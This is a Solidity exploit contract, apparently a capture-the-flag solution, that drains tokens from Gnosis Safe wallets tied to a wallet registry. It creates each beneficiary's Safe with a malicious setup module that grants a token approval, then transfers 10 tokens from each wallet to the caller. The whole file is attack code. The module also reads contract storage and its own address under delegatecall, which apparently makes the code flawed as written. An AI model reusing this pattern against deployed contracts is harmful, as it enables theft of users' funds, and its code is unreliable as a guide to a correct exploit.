// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorExploit {
    address tokenAddress;

    function start(
        address masterCopyAddress,
        GnosisSafeProxyFactory walletFactoryAddress,
        IProxyCreationCallback walletRegistry,
        address _tokenAddress,
        address[] calldata wallets
    ) public {
        tokenAddress = _tokenAddress;
        bytes memory modulePayload = abi.encodeWithSignature(
            "gnosisModuleInterface()"
        );

        for (uint8 i = 0; i < wallets.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = wallets[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                modulePayload,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy myProxy = GnosisSafeProxyFactory(
                walletFactoryAddress
            ).createProxyWithCallback(
                    masterCopyAddress,
                    initializer,
                    block.number,
                    walletRegistry
                );

            IERC20(_tokenAddress).transferFrom(
                address(myProxy),
                msg.sender,
                10 ether
            );
        }
    }

    function gnosisModuleInterface() external {
        IERC20(tokenAddress).approve(address(this), 10 ether);
    }
}
